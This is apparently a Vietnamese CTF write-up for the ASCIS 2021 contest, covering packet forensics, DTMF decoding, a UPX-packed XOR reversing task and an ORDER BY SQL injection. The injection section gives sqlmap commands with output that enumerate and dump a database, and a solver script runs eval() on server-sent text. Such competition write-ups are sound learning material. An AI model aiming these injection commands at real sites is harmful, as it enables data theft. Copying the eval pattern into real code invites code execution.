# ASEAN STUDENT CONTEST ON INFORMATION SECURITY 2021

### Overview
 | Title | Category | Points | Flag
 | ------ | ------ | ------ | ------ |
 | [Hitech Shop](#Hitech-Shop) | Web | 100 | `ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY}` |
 | yeuvcs | Web | 200 |  |
 | [CALL ME MAYBE](#CALL-ME-MAYBE) | Crypto | 100 | `FLAG{SMS AND DMTF}` |
 | AES ECB crypto challenge | Crypto | 200 |  |
 | echo server | Pwnable | 100 |  |
 | Guessme | Pwnable | 200 |  |
 | Keygen me | Reverse | 100 |  |
 | [Decrypt me](#Decrypt-me) | Reverse | 200 | `ASCIS{x0r_me_t0_get_the_flag}` |
 | [Simple For](#Simple-For) | Misc | 100 | `ASCIS{n3tw0rk_f0r3ns1c_1s_n0t_h4rd}` |
 | [Calculate me](#Calculate-me) | Misc | 100 | `ASCIS{3v3ry0n3_sh0uld_kn0w_pr0gramm1ng}` |
 
# Simple For
 
### Challenge
 
<img src=files/185903.png>
 
[capture.pcap](files/capture.pcap)
 
### Solution

<img src=files/191647.png>

* Follow TCP Stream

<img src=files/191756.png>

# Calculate me
 
### Challenge
 
<img src=files/192446.png>
 
### Solution

* Dùng netcat truy cập ta nhận được như sau. (timeout là 5s)

<img src=files/192943.png>

* Viết chương trình socket giao tiếp với server.

```python
# !/usr/bin/python
import socket

def receive_one_line(s):
    r = b''

    # Lần lượt nhận từng ký tự, nếu là ký tự xuống dòng thì ngưng
    while (True):
        t = s.recv(1)
        if t == b'\n': break
        r = r + t

    # Trả về kết quả dạng string
    return r.decode()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('125.235.240.166',20103))

data = receive_one_line(s)
print(data)
data = receive_one_line(s)
print(data)
while True:
    data = receive_one_line(s)
    print(data)

    str = int(eval(data[:data.find('=')]))
    print(str)

    s.sendall(f"{str}\n".encode())

    data = receive_one_line(s)
    print(data)
    data = receive_one_line(s)
    print(data)
```

* Kết quả ta lấy được cờ.

<img src=files/193213.png>

# Simple For

### Challenge

<img src=files/193838.png>

### Solution

* DTMF Code

<img src=files/194556.png>

* Phone (SMS)

<img src=files/194643.png>

* Cipher.txt > [DTMF Code](https://www.dcode.fr/dtmf-code) > 777767777026630368333 > [Multi-tap Phone (SMS)](https://www.dcode.fr/multitap-abc-cipher) > SMS AND DMTF

# Hitech Shop

### Challenge

<img src=files/195002.png>

### Solution

* Fuz thử với dấu `'` ta không thấy display ra lỗi. Vậy guess là web server sử dụng hàm set_error_handler để catch lỗi.

<img src=files/195305.png>

* Dùng sqlmap để exploit.

```
# sqlmap -u "http://125.235.240.166:20105/index?order=name" --dbs                  
...
available databases [2]:
[*] information_schema
[*] vannd
...
# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd --tables      
...
Database: vannd
[2 tables]
+----------+
| flag     |
| products |
+----------+
...
# sqlmap -u "http://125.235.240.166:20105/index?order=name" -D vannd -T flag --dump
Database: vannd
Table: flag
[1 entry]
+---------------------------------------+
| secret                                |
+---------------------------------------+
| ASCIS{SQL_1nJecTi0n_Ba5e_0N_OrdeR_bY} |
+---------------------------------------+
...
```

# Decrypt me 

*(Solution này của anh Nguyên nhóm mình viết lại và share cho mình. Tks anh Nguyên 🤗.)*

### Challenge

<img src=files/151202.png> 

<img src=files/151256.png>

### Solution

Thực kiểm kiểm tra thông tin file ta thấy file PE – 32bit và được đóng gói (pack) bởi UPX.

<img src=files/151621.png>

Tiến hành Unpack file.

<img src=files/151731.png>

Gặp lỗi trong quá trình Unpack nên thực hiện unpack thủ công

* Tìm giá trị OEP - Original Entry Point

* Thực hiện các thao tác trong OllyDBG để tìm đc giá trị OEP (Chương trình sẽ bắt đầu thực thi ở đây)

<img src=files/151956.png>

* Jump đến địa chỉ thấy có 2 lệnh PUSHAD và POPAD, câu lệnh dùng để giải mã đoạn code thực thi của chương trình gốc, sau đó nó sẽ nhảy đến function DescryptM.00A713B9 -> DescryptM.00A713B9 là chương trình gốc mình cần phải xử lý

<img src=files/152318.png>

* Jump đến func DescryptM.00A713B9 (Chương trình gốc đã tìm thấy sau khi bị Pack) 

<img src=files/152417.png>

* Thực hiện dump dữ liệu ta sẽ có file code chính xác , đưa vào IDA để dễ xem code

<img src=files/152501.png>

* Sau khi đã có code ta thực hiện trace, thấy chương trình xử lý dữ liệu ở function 

<img src=files/152617.png>

* Sub_A71040 thực hiện việc lấy dữ liệu đầu vào, đưa nó vào một function Sub_A74B25 (function này sẽ trả về một giá trị dựa vào dữ liệu đầu vào) sau đó dữ liệu output của Sub_A74B25 sẽ được bỏ vào biến Var_1C và output dịch phải 8bit sẽ được bỏ vào Var_20

<img src=files/152709.png>

* 2 Biến Var_1C và Var_20 sẽ được bỏ vào loc_A710E9 để xử lý - Tóm gọn chương trình này cho 1 chuỗi đã bị mã hóa byte_A898B0 = [0x2c,0x62,0x2E,0x78,0x3E,0x4A,0x15,0x1,0x1f,0x62,0x0C,0x54,0x32,0x45,0x5D,0x6E]
* Chạy vòng lặp từ 0 đến 1E, nếu là I số chẵn thì lấy Byte_A898B0[I] xor với Var_20 nếu là số lẻ thì lấy Byte_A898B0[I] xor với Var_1C

<img src=files/152738.png>

* Sau khi đã xor hết Byte_A898B0, 1E byte nó sẽ kiểm tra 5 kết quả xor đầu tiên có đúng là ASCIS không

<img src=files/152824.png>

* => Tìm được giá trị tại Var_1C = 0x31 và Var_20 = 0x6D, Thực hiện lại debug và gán cho Var_1C và Var_20 đúng giá trị 0x31 và 0x6D, chương trình sẽ thực hiện xor để lấy được flag

<img src=files/152856.png>

* (lưu ý: A xor B = B xor A)

